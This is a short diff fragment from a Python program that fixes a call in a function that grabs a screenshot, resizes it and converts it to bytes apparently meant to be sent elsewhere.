@@ -64,7 +64,7 @@ def open_process(name):
 def take_screen_shot():
     image = ImageGrab.grab(bbox=None)
 
-    image = image.resize(3200, 1800)
+    image = image.resize((3200, 1800))
 
     photo_to_send = image.tobytes()
 
